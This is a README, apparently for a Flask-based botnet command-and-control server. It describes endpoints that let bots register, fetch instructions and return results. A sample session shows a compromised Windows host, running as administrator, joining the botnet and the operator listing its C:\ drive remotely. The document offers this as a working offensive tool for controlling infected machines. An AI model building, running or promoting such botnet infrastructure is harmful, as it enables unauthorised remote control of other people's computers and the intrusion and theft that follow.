# Master Of the Botnet

The botnet master is a Flask server that hosts the following endpoints:

- POST `/welcome`:
    - This enpoint is used to connect the bot to the botnet.
- POST `/bye`:
    - This enpoint is used to disconnect the bot to the botnet.
- GET `/c2`:
    - This enpoint is used to retrive the instructions by the bots.
- POST `/c2`:
    - This enpoint is used to retrive the result of the instructions from the bots.

### Usage:

```powershell
$ python master-botnet.py

Welcome to the master of botnets via HTTP...

Choose a bot:  * Serving Flask app 'master-botnet'
 * Debug mode: off

[+] We have a New Family Member, say hello to Windows-01

[0] Windows-01

Choose a bot: 0
Windows-01>
[Windows-01] Has something for you...
Windows-01\administrator

Windows-01> ls /
Windows-01>
[Windows-01] Has something for you...

    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        07/05/2022     07:24                PerfLogs
d-r---        02/12/2024     08:20                Program Files
d-r---        26/11/2024     14:10                Program Files (x86)
d-----        03/12/2024     15:31                tmp
d-r---        26/11/2024     12:56                Users
d-----        14/10/2024     22:57                Windows
d-----        03/08/2024     13:35                XboxGames
-a----        22/02/2024     00:33         112136 appverifUI.dll
-a----        22/02/2024     00:34          66328 vfcompat.dll

Windows-01>
```